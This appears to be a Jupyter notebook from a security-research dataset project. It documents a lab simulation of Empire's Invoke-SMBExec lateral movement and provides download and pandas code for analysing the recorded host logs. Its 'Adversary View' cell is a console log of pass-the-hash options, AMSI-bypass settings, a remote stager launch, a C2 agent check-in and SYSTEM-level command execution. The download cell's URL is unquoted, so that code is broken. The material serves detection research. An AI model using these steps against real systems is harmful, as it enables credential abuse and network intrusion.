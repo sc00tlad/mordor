{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "717b4419",
   "metadata": {},
   "source": [
    "# Empire Invoke SMBExec"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "191c9f23",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a52b595",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1021.002](https://attack.mitre.org/techniques/T1021/002) |\n",
    "| Tags              | RPC CreateService,RPC StartService,SMB Svcctl |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "71223b93",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries remotely creating and starting a service via RPC methods over SMB named pipes such as svcctl."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "11d2b5d3",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a8f0107e",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_smbexec_dcerpc_smb_svcctl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_smbexec_dcerpc_smb_svcctl.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_smbexec_dcerpc_smb_svcctl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_smbexec_dcerpc_smb_svcctl.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d016ab82",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4dbc5669",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6622b97b",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [invoke_smbexec](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-SMBExec.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b471d4f",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: 7ADX8ZVR) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "7ADX8ZVR ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         8948   5/0.0    2020-09-20 06:34:21  http            \n",
    "\n",
    "\n",
    "(Empire: agents) > interact 7ADX8ZVR\n",
    "(Empire: 7ADX8ZVR) > usemodule lateral_movement/invoke_smbexec\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash 81d310fa34e6a56a31145445891bb7b8\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set Username pgustavo\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain theshire\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName WORKSTATION6.theshire.local\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > info\n",
    "\n",
    "              Name: Invoke-SMBExec\n",
    "            Module: powershell/lateral_movement/invoke_smbexec\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @rvrsh3ll\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using SMBExec.ps1. This\n",
    "  module requires a username and NTLM hash\n",
    "\n",
    "Comments:\n",
    "  https://raw.githubusercontent.com/Kevin-Robertson/Invoke-\n",
    "  TheHash/master/Invoke-SMBExec.ps1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        7ADX8ZVR                  Agent to run module on.                 \n",
    "  CredID           False                                 CredID from the store to use.           \n",
    "  ComputerName     True        WORKSTATION6.theshire.lo  Host[s] to execute the stager on, comma \n",
    "                              cal                       separated.                              \n",
    "  Username         True        pgustavo                  Username.                               \n",
    "  Domain           False       theshire                  Domain.                                 \n",
    "  Hash             True        81d310fa34e6a56a31145445  NTLM Hash in LM:NTLM or NTLM format.    \n",
    "                              891bb7b8                \n",
    "  Service          False                                 Name of service to create and delete.   \n",
    "                                                        Defaults to 20 char random.             \n",
    "  Listener         False       http                      Listener to use.                        \n",
    "  Command          False                                 Custom command to run.                  \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > execute\n",
    "[*] Tasked 7ADX8ZVR to run TASK_CMD_WAIT\n",
    "[*] Agent 7ADX8ZVR tasked with task ID 3\n",
    "[*] Tasked agent 7ADX8ZVR to run module powershell/lateral_movement/invoke_smbexec\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > \n",
    "Command executed with service PGUJLOAKFQFVOMHGFQPX on WORKSTATION6.theshire.local\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n",
    "[*] New agent 3KL8YRUB checked in\n",
    "[+] Initial agent 3KL8YRUB from 172.18.39.6 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 3KL8YRUB at 172.18.39.6\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_smbexec) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "7ADX8ZVR ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         8948   5/0.0    2020-09-20 06:57:53  http            \n",
    "\n",
    "3KL8YRUB ps 172.18.39.6     WORKSTATION6      *THESHIRE\\SYSTEM        powershell         1152   5/0.0    2020-09-20 06:57:49  http            \n",
    "\n",
    "(Empire: agents) > interact 3KL8YRUB\n",
    "(Empire: 3KL8YRUB) > shell whoami\n",
    "[*] Tasked 3KL8YRUB to run TASK_SHELL\n",
    "[*] Agent 3KL8YRUB tasked with task ID 1\n",
    "(Empire: 3KL8YRUB) > \n",
    "nt authority\\system\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 3KL8YRUB) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03b450d2",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "94d2e9cd",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "20f1610e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_smbexec_dcerpc_smb_svcctl.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f900f0f0",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86df57eb",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ed0e52ef",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0d7f6b16",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a40b1415",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/) \n",
    "* [https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
